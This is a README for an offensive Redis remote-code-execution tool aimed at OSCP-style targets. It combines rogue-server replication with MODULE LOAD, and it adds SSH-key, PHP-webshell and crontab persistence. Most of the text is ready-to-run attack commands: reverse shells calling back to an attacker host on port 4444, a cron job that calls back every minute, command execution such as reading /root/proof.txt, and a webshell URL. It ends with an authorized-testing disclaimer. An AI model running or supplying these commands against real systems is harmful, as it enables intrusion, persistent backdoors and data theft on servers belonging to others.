# 🐺 Hacking Husky — Redis RCE

Redis 4.x/5.x/6.x/7.x authenticated RCE tool built for OSCP conditions — unstable boxes, cron resets, dropped connections, and the 10-minute foothold window that makes you want to throw your laptop.

Combines the MODULE LOAD replication exploit with three persistence methods that **don't need MODULE LOAD at all** — so when a cron wipes Redis every 10 minutes, you already have SSH access and don't care.

```
  ╔═══════════════════════════════════════════════════╗
  ║  🐺 Hacking Husky — Redis RCE                     ║
  ║  Replication + MODULE LOAD → Shell                ║
  |  github.com/TheHuskyHacker                        ║
  ╚═══════════════════════════════════════════════════╝
```

## Why This Exists

The existing tools ([Ridter/redis-rce](https://github.com/Ridter/redis-rce), [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)) work fine in a lab:

- A cron resets Redis config every 10 minutes → your module gets unloaded
- The connection drops mid-exploit → you start over
- MODULE LOAD works once, but the service restarts → gone
- You get a shell but can't stabilize before the reset hits

This tool fixes all of that with **persistence-first** options and auto-retry logic.

## Install

```bash
git clone https://github.com/HackingHusky/husky-redis-rce.git
cd husky-redis-rce
chmod +x husky-redis-rce.py

# Build the Redis module (or use the pre-built module.so)
cd RedisModules-ExecuteCommand && make && cp module.so .. && cd ..
```

Requirements: Python 3.6+ (stdlib only — no pip dependencies).

## The Game Plan

When you hit a Redis box on the OSCP, run these in order:

```bash
# 1. Recon — see what you're working with
python3 husky-redis-rce.py -r TARGET --recon

# 2. Write SSH key FIRST — this survives everything
ssh-keygen -t rsa -f husky_key -N ''
python3 husky-redis-rce.py -r TARGET --ssh-key husky_key.pub

# 3. SSH in — now you have stable access regardless of Redis state
ssh -i husky_key redis@TARGET

# 4. THEN do MODULE LOAD for RCE if you need it
python3 husky-redis-rce.py -r TARGET -l LHOST -x 'cat /root/proof.txt'
```

Step 2 is the key insight: SSH key persistence uses only `CONFIG SET dir` + `SAVE`, which works on any Redis with CONFIG access. No module, no replication, no rogue server. The cron can reset Redis every 30 seconds and your SSH key survives because it's written to the filesystem, not stored in Redis memory.

## Usage

### Recon

```bash
python3 husky-redis-rce.py -r 10.10.10.5 --recon
```

Dumps version, OS, config paths, dir/dbfilename, replication role, loaded modules. Tells you what you're working with before you commit.

### One-Shot Command (MODULE LOAD)

```bash
python3 husky-redis-rce.py -r 10.10.10.5 -l 10.10.14.2 -x 'id'
python3 husky-redis-rce.py -r 10.10.10.5 -l 10.10.14.2 -x 'cat /root/proof.txt'
```

### Interactive Shell (MODULE LOAD)

```bash
python3 husky-redis-rce.py -r 10.10.10.5 -l 10.10.14.2
```

### Reverse Shell (MODULE LOAD)

```bash
# With built-in listener
python3 husky-redis-rce.py -r 10.10.10.5 -l 10.10.14.2 \
    --rev --lport-rev 4444 --listen

# Different payload if nc isn't on the target
python3 husky-redis-rce.py -r 10.10.10.5 -l 10.10.14.2 \
    --rev --lport-rev 4444 --payload bash
```

### SSH Key Persistence (No Module Needed)

```bash
# Generate a key pair
ssh-keygen -t rsa -f husky_key -N ''

# Write pubkey to target
python3 husky-redis-rce.py -r 10.10.10.5 --ssh-key husky_key.pub

# Connect (the script tells you the exact command)
ssh -i husky_key redis@10.10.10.5
```

The script tries `/var/lib/redis/.ssh`, `/home/redis/.ssh`, and `/root/.ssh`. Override with `--ssh-dir`:

```bash
python3 husky-redis-rce.py -r 10.10.10.5 --ssh-key husky_key.pub --ssh-dir /home/user/.ssh
```

### Webshell (No Module Needed)

```bash
python3 husky-redis-rce.py -r 10.10.10.5 --webshell /var/www/html
# → http://10.10.10.5/husky.php?cmd=id
```

### Crontab Persistence (No Module Needed)

```bash
python3 husky-redis-rce.py -r 10.10.10.5 --crontab --lhost 10.10.14.2 --lport-rev 4444
# Shell calls back every minute — start: nc -lvnp 4444
```

### With Auth

```bash
python3 husky-redis-rce.py -r 10.10.10.5 -l 10.10.14.2 -a 'P@ssw0rd' -x 'id'
```

### Auto-Retry (For Unstable Boxes)

```bash
# Retry 3 times if the connection drops or exploit fails
python3 husky-redis-rce.py -r 10.10.10.5 -l 10.10.14.2 -x 'id' --retry 3
```

### Server-Only (SSRF/Blind)

```bash
python3 husky-redis-rce.py -l 10.10.14.2 --server-only
```

## Attack Methods Comparison

| Method | Needs MODULE? | Survives Reset? | Needs Lhost? | Speed |
|--------|:---:|:---:|:---:|:---:|
| MODULE LOAD → exec | Yes | No | Yes | Fast |
| MODULE LOAD → revshell | Yes | No | Yes | Fast |
| SSH key write | No | **Yes** | No | Instant |
| Webshell write | No | **Yes** | No | Instant |
| Crontab write | No | **Yes** | Yes | ~1 min |

**SSH key** is the best option on OSCP boxes with cron resets — it's instant, needs no rogue server, and survives absolutely everything short of someone deleting the file.

## Flags Reference

| Flag | Description |
|------|-------------|
| `-r`, `--target` | Target Redis host |
| `-p`, `--rport` | Redis port (default: 6379) |
| `-a`, `--auth` | Redis password |
| `-l`, `--lhost` | Your IP for rogue server / reverse shell |
| `--lport` | Rogue server port (default: 21000) |
| `-f`, `--file` | Module .so path (default: module.so) |
| `--module-name` | Filename written on target (default: husky.so) |
| `-x`, `--cmd` | One-shot command |
| `--rev` | Reverse shell mode |
| `--lport-rev` | Reverse shell callback port |
| `--listen` | Start built-in reverse listener |
| `--payload` | Shell type: module/mkfifo/bash/python |
| `--ssh-key` | Write this SSH pubkey for persistence |
| `--ssh-dir` | Override target .ssh directory |
| `--webshell` | Write PHP webshell to this web root |
| `--crontab` | Write cron reverse shell |
| `--recon` | Fingerprint only |
| `--server-only` | Rogue server only (SSRF/blind) |
| `--retry` | Retry count on failure (default: 1) |
| `--timeout` | Socket timeout in seconds (default: 8) |
| `-v` | Verbose RESP traffic |

## File Structure

```
husky-redis-rce/
├── husky-redis-rce.py              # Main exploit script
├── module.so                        # Pre-built Redis module (x86_64)
├── README.md
└── RedisModules-ExecuteCommand/     # Module source (for recompilation)
    ├── Makefile
    └── src/
        ├── module.c
        └── redismodule.h
```

## Credits

- [Ridter/redis-rce](https://github.com/Ridter/redis-rce)
- [n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)
- [Pavel Toporkov — Redis post-exploitation (ZeroNights 2018)](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)

## Disclaimer

For authorized security testing and CTF competitions only.
